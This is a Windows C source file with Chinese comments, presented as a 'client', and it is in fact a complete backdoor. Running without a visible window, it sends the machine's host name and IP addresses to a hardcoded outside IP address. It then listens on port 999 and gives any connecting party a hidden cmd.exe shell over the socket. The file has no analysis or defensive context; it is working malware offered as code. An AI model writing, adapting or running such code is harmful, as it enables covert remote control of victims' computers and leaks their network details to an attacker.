//客服端：

#include<stdio.h>
#include<string.h>
#include<Winsock2.h>
#include <windows.h>
#include<time.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
#define MasterPort 999  //定义监听端口999
int main()
{
	WSAData wsaData;
	int err=WSAStartup(WINSOCK_VERSION,&wsaData);
	if(0!=err)
	{
		return -1;
	}
	SOCKET sock;
	sock=socket(AF_INET,SOCK_DGRAM,0);
	if(INVALID_SOCKET==sock)
	{
		printf("socket()Failed:%d\n",WSAGetLastError());
		WSACleanup();
		return -1;
	}
	
	char dest_ip[]="222.196.200.150";      //目的IP
	unsigned short dest_port=20000;//目的端口
	
	sockaddr_in RemoteAddr;
	RemoteAddr.sin_family = AF_INET;
	RemoteAddr.sin_port = htons(dest_port);
	RemoteAddr.sin_addr.s_addr=inet_addr(dest_ip);

	char host_name[255];
	//获取本地主机名称
	if (gethostname(host_name, sizeof(host_name)) == SOCKET_ERROR) 
	{
		printf("Error %d when getting local host name.", WSAGetLastError());
		return 1;
	}

	int sByte = sendto(sock,host_name,strlen(host_name),0,(sockaddr*)&RemoteAddr,sizeof(RemoteAddr));
	if(SOCKET_ERROR==sByte)
	{
		printf("sendto()Failed:%d\n",WSAGetLastError());
		closesocket(sock);
		WSACleanup();
		return -1;
	}
	
	//从主机名数据库中得到对应的“主机”
	struct hostent *phe = gethostbyname(host_name);
	if (phe == 0) 
	{
		printf("Yow! Bad host lookup.");
		return 1;
	}
	
	//循环得出本地机器所有IP地址
	for (int i = 0; phe->h_addr_list[i] != 0; ++i) 
	{
		struct in_addr addr;
		memcpy(&addr, phe->h_addr_list[i], sizeof(struct in_addr));
		//printf("Address %d : %s\n" , i, inet_ntoa(addr));
		Sleep(500);
		int sByte = sendto(sock,inet_ntoa(addr),strlen(inet_ntoa(addr)),0,(sockaddr*)&RemoteAddr,sizeof(RemoteAddr));
		if(SOCKET_ERROR==sByte)
		{
			printf("sendto()Failed:%d\n",WSAGetLastError());
			closesocket(sock);
			WSACleanup();
			return -1;
		}
	}
    closesocket(sock);
    WSACleanup();


	WSADATA WSADa;
	sockaddr_in SockAddrIn;	
	SOCKET CSocket,SSocket;	
	int iAddrSize;
	PROCESS_INFORMATION ProcessInfo;
	STARTUPINFO StartupInfo;
	char szCMDPath[255];
	
	//分配内存资源，初始化数据：
	ZeroMemory(&ProcessInfo, sizeof(PROCESS_INFORMATION));
	ZeroMemory(&StartupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&WSADa, sizeof(WSADATA));
	
	 
	
	//获取cmd路径
	GetEnvironmentVariable("COMSPEC",szCMDPath,sizeof(szCMDPath));
	//加载ws2_32.dll：
	WSAStartup(0x0202,&WSADa);
	
	 
	
	//设置本地信息和绑定协议，建立socket，代码如下
	SockAddrIn.sin_family = AF_INET;
	SockAddrIn.sin_addr.s_addr = INADDR_ANY;
	SockAddrIn.sin_port = htons(MasterPort);
	CSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	 
	
	//设置绑定端口999：
	bind(CSocket,(sockaddr *)&SockAddrIn,sizeof(SockAddrIn));
	 //设置服务器端监听端口：
	listen(CSocket,1);
	
	iAddrSize = sizeof(SockAddrIn);
	
	//开始连接远程服务器，并配置隐藏窗口结构体：
	SSocket = accept(CSocket,(sockaddr *)&SockAddrIn,&iAddrSize);
	StartupInfo.cb = sizeof(STARTUPINFO);
	StartupInfo.wShowWindow = SW_HIDE;
	StartupInfo.dwFlags = STARTF_USESTDHANDLES |
	STARTF_USESHOWWINDOW;
	StartupInfo.hStdInput = (HANDLE)SSocket;
	StartupInfo.hStdOutput = (HANDLE)SSocket;
	StartupInfo.hStdError = (HANDLE)SSocket;
	
	//创建匿名管道：
	CreateProcess(NULL, szCMDPath, NULL, NULL, TRUE, 0, NULL, NULL, &StartupInfo, &ProcessInfo);
	WaitForSingleObject(ProcessInfo.hProcess, INFINITE);
	CloseHandle(ProcessInfo.hProcess);
	CloseHandle(ProcessInfo.hThread);
	//关闭进程句柄：
	closesocket(CSocket);
	closesocket(SSocket);
	WSACleanup();
	
	//关闭连接卸载ws2_32.dll
	return 0;
}